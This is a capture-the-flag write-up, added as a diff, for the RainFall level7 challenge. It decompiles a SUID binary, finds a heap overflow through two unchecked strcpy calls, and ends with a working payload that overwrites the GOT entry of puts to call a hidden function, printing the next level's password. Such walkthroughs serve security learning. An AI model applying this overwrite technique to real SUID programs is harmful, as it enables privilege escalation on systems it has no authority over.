@@ -1,0 +1,86 @@
+When we change to level7 user, we're greeted with:
+
+```shell
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level7/level7
+```
+
+We find another SUID executable, this time owned by level8.
+
+```shell
+level7@RainFall:~$ ls -l
+total 8
+-rwsr-s---+ 1 level8 users 5366 Mar  6  2016 level7
+```
+
+When executing, it just has a segmentation fault.
+
+```shell
+level7@RainFall:~$ ./level7
+Segmentation fault (core dumped)
+```
+
+Copying it over and decompiling.
+
+```shell
+┌──(kali㉿kali)-[~]
+└─$ scp -P 4242 level7@192.168.184.128:/home/user/level7/level7 .
+          _____       _       ______    _ _
+         |  __ \     (_)     |  ____|  | | |
+         | |__) |__ _ _ _ __ | |__ __ _| | |
+         |  _  /  _` | | '_ \|  __/ _` | | |
+         | | \ \ (_| | | | | | | | (_| | | |
+         |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|
+
+                 Good luck & Have fun
+
+  To start, ssh with level0/level0 on 192.168.184.128:4242
+level7@192.168.184.128's password:
+level7                                                                                                                                100% 5366   892.7KB/s   00:00
+```
+
+The decompiled code looks like this:
+
+```C
+void m(void *param_1,int param_2,char *param_3,int param_4,int param_5)
+{
+  time_t tVar1;
+  
+  tVar1 = time((time_t *)0x0);
+  printf("%s - %d\n",c,tVar1);
+  return;
+}
+
+undefined4 main(undefined4 param_1,int param_2)
+{
+  undefined4 *puVar1;
+  void *pvVar2;
+  undefined4 *puVar3;
+  FILE *__stream;
+  
+  puVar1 = (undefined4 *)malloc(8);
+  *puVar1 = 1;
+  pvVar2 = malloc(8);
+  puVar1[1] = pvVar2;
+  puVar3 = (undefined4 *)malloc(8);
+  *puVar3 = 2;
+  pvVar2 = malloc(8);
+  puVar3[1] = pvVar2;
+  strcpy((char *)puVar1[1],*(char **)(param_2 + 4));
+  strcpy((char *)puVar3[1],*(char **)(param_2 + 8));
+  __stream = fopen("/home/user/level8/.pass","r");
+  fgets(c,0x44,__stream);
+  puts("~~");
+  return 0;
+}
+```
+
+We noticed that there are 2 strcpy which we overflow the buffer at `puVar1[1]` and `puVar3[1]`. We also notice there is also a function `m` which will print the next level pass and is not being called anywhere.
+
+So we can overflow the `puVar1[1]` buffer to change where `puVar3[1]` is pointing at, in this case we want it to point to the address of `puts` on the .got.plt segment, which is `0x08049928`. Then we can overwrite the value to the address of function `m` so it will be called instead of `puts`.
+
+With that we can build the payload
+```shell
+level7@RainFall:~$ ./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+```
